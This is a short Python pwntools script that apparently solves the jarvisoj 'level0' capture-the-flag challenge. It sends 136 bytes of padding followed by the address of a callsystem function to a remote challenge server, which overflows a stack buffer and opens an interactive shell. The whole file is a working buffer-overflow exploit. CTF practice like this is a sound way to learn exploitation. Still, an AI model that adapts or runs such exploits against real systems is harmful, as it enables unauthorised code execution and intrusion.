#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

ELF_IMG = './level0'

offset = 136

callsystem = 0x400596

# io = process(ELF_IMG)
io = remote('pwn2.jarvisoj.com', 9881)

io.sendlineafter('\n', 'a' * offset + p64(callsystem))

io.interactive()
